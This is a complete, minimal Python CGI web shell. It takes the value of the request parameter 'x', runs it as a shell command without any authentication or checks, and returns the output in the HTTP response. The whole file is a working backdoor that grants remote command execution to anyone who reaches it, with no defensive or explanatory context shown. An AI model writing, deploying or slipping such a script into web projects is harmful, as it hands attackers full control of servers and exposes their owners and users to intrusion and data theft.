#!/usr/bin/python3

import cgi
import subprocess
print("Content-Type: text/html\n\n")
field = cgi.FieldStorage()
cmd = field.getvalue('x')
out = subprocess.getoutput(cmd)
print(out)

